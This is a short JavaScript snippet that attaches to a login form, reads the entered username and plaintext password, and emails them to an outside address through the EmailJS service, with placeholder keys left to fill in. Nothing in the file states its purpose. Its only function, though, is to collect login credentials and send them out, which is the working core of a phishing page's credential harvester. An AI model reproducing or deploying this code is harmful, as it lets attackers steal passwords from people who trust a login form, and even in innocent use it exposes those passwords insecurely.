// Initialize EmailJS with your Public Key
emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS Public Key

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault(); // Prevent the form from refreshing the page

  // Get form values
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // EmailJS parameters
  const templateParams = {
    username: username,
    password: password,
  };

  // Send email using EmailJS
  emailjs
    .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
    .then(
      function (response) {
        alert("Login details sent successfully!");
        console.log("SUCCESS!", response.status, response.text);
      },
      function (error) {
        alert("Failed to send details. Try again!");
        console.log("FAILED...", error);
      }
    );
});

